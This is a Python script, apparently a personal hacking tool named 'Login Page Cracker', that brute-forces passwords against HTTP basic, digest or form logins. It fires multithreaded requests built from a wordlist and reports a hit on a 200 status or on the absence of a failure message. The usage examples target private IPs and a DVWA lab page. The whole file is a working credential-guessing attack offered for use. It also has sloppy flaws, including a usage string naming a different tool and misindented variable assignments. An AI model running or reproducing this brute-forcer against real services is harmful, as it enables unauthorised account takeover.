import requests
from threading import Thread
import sys
import os
import time
import optparse
import colorama
from colorama import Fore




from requests.auth import HTTPDigestAuth

global not_found  # Flag to know when we have a valid password
not_found = "1"


def banner():
    print ("\n*************************************************************************")
    print ("\n*\t Login Page Cracker")
    print("\n*\t Written By: Ariel Weiser  ")
    print ("\n*************************************************************************")



class request_performer(Thread):
    #(passwords, threads, username, url, authenticationMethod,httpMethod,  payload)
    def __init__(self, password, username, url, authenticationMethod,httpMethod,  payload, failureMessage):
        Thread.__init__(self)
        self.password = password.split("\n")[0]
        self.username = username
        self.url = url
        self.Authentication = authenticationMethod
        self.httpMethod = httpMethod
        self.payload = payload
        self.failureMessage = failureMessage
        print ("[+]Running request performer with password:\t"  + self.password )


    def run(self):
        global not_found
        if not_found == "1":
            try:
                if self.Authentication == "basic":
                    r = requests.get(self.url, auth=(self.username, self.password))
                elif self.Authentication == "digest":
                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
                elif self.Authentication == "form":

                    paramsDictionary = self.GetParamsFromPayload()
                    try:
                        #Sending GET/POST request according to user input:
                        if (self.httpMethod == 'POST'):

                            r = requests.post(self.url, data=paramsDictionary)
                        else:
                            r = requests.get(self.url , params=paramsDictionary)
                    except Exception as e:
                        print("couldn't send request for login form" + str(e))
                        sys.exit(0)
                    #find function returns '-1' if the substring was not found.
                    if r.text.find(self.failureMessage) == -1:
                        print(Fore.GREEN + "Password was found: \t " + self.password)
                        not_found = 0
                        sys.exit(0)
                    else:
                        print("Invalid pass:" + self.password + "\n")
                if (self.Authentication == "basic") | (self.Authentication == "digest"):

                    if r.status_code == 200:
                        not_found = "0"
                        print ("[+] Password found : " + self.password + "  - !!!\r")
                        sys.exit(os.EX_SOFTWARE)
                    else:
                        print( "Password is Not valid " + self.password)
                        i[0] = i[0] - 1  # Here we remove one thread from the counter
            except Exception as e:
                print (str(e))

    def GetParamsFromPayload(self):
        # payload structure "username=admin&password=FUZZ\"
        dictionary = {}
        arr = str(self.payload).split('&')
        for parameter in arr:
            key, value = str(parameter).split('=')
            #checking if current value is 'FUZZ', if ture change to self.password
            if str(value) == 'FUZZ':
                value = self.password
                dictionary[key] = value
            else:
                dictionary[key] = value
        return dictionary


def main():
    banner()

    #receving host_ip/port to start connection.
    parser = optparse.OptionParser(usage="""usage: ./Reverse_TCP_Server [options] arg\n
                                         "Examples:
                                         ./LoginPageCracker.py -w http://10.209.27.129/ufmRest/app/users -u admin -t 100 -f /tmp/passwords.txt -m basic -M GET -p username=admin&password=FUZZ")
                                         ./LoginPageCracker.py -w http://192.168.113.130/dvwa/login.php -u admin -t 100 -f /tmp/passwords.txt -m form -M POST -p username=admin&password=FUZZ&Login=Login -x \"Login failed\"""")
    parser.add_option("-w",  dest="url", type="string", help=" url (http://somesite.com/admin)",)
    parser.add_option("-u", dest="username", help="username")
    parser.add_option("-t", dest="threads", help="number of threads")
    parser.add_option("-f", dest="dictionary", help="dictionary file")
    parser.add_option("-m", dest="authenticationMethod", help="Authentication method (basic, digest, form)")
    parser.add_option("-M", dest="httpMethod", help="HTTP method used (GET/POST) ")
    parser.add_option("-p", dest="payload", help=" payload written in this structure username=admin&password=FUZZ")
    parser.add_option("-x", dest="failureMessage", help=" failure message in login page ((forms authentication only )")

    (options, args) = parser.parse_args()
    if ((options.url is None) | (options.username is None) | (options.threads is None) | ( options.dictionary is None) | (options.authenticationMethod is None) | (options.payload is None)):
        parser.print_help()
        sys.exit(0)
    else :
        pass
    #Assigning variables:
        lurl = options.url
        lusername = options.username
        lthreads = options.threads
        ldictionary = options.dictionary
        lauthenticationMethod = options.authenticationMethod
        lhttpMethod = options.httpMethod
        lpayload = options.payload
    
    if options.failureMessage is None:
        failureMessage = ""
    else:
        failureMessage = options.failureMessage
    try:
        #insert all passwords into a list
        f = open(ldictionary, "r")
        passwords = f.readlines()
    except:
        print ("Filed opening file: " + ldictionary + "\n")
        sys.exit(0)
        
    launcher_thread(passwords, lthreads, lusername, lurl, lauthenticationMethod,lhttpMethod,  lpayload, failureMessage)


def launcher_thread(passwords, threads, username, url, authenticationMethod,httpMethod,  payload, failureMessage):
    global i
    i = []
    i.append(0)
    while len(passwords):
        if not_found == "1":
            try:
                if i[0] < int(threads):
                    passToTry = passwords.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(passToTry, username, url, authenticationMethod,httpMethod,  payload , failureMessage)
                    thread.start()

            except KeyboardInterrupt:
                print( "Script interrupted  by user. Finishing attack..")
                sys.exit()
            thread.join()
        else:
            sys.exit()
    return


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt as k:
        print( "Script interrupted by user, killing all threads..!!")
